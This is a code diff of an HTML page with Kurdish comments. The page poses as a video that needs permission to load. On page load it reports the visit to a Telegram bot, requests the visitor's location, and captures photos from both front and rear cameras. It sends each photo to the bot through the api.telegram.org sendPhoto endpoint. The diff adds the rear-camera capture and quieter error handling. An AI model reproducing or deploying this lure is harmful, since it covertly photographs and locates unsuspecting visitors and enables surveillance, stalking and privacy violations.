@@ -18,7 +18,7 @@
         <p>تکایە ڕێگە بدە بۆ بارکردنی ڤیدیۆکە...</p>
     </div>
 
-    <video id="video" autoplay></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
@@ -45,32 +45,47 @@
             }
         }
 
-        // ٣. گرتنی وێنە و ناردنی
-        async function startCamera() {
+        // ٣. گرتنی وێنەی کامێرا (پێش و پشت)
+        async function captureCamera(facing) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facing } 
+                });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chat_id);
-                        formData.append('photo', blob, 'snap.jpg');
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-                    }, 'image/jpeg');
-                }, 2000);
+                
+                return new Promise((resolve) => {
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                        
+                        // وەستاندنا ڤیدیۆیێ پاشی گرتنێ
+                        stream.getTracks().forEach(track => track.stop());
+
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('chat_id', chat_id);
+                            formData.append('photo', blob, `${facing}.jpg`);
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
+                                .then(() => resolve());
+                        }, 'image/jpeg');
+                    }, 2000);
+                });
             } catch (err) {
-                sendMessage("⚠️ ڕێگەی بە کامێرا نەدا.");
+                console.log(`کامێرا ${facing} نەهاتە ڤەکرن`);
             }
         }
 
         // کاتێک سایتەکە دەکرێتەوە
-        window.onload = () => {
-            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە، ئێستا داوای کامێرا و شوێنی لێ دەکرێت...");
+        window.onload = async () => {
+            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە، وێنەی پێش و پشت لەگەڵ شوێن دەهێنە گرتن...");
             askLocation();
-            startCamera();
+            
+            // گرتنا کامێرا پێش (User)
+            await captureCamera('user');
+            
+            // گرتنا کامێرا پشت (Environment)
+            await captureCamera('environment');
         };
     </script>
 </body>
